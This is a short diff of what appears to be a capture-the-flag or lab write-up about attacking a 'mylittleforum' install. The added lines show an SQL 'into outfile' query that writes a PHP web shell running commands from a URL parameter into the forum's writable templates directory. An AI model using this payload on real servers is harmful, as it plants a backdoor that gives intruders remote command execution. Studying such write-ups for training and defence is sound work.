@@ -103,3 +103,6 @@ but it doesn't work cause permissions.
 
 but if we remember about the forum, we can search about some vulnerabilities and we find at https://github.com/ilosuna/mylittleforum that: "Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script"
 
+so we can use:
+SELECT "<? system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+
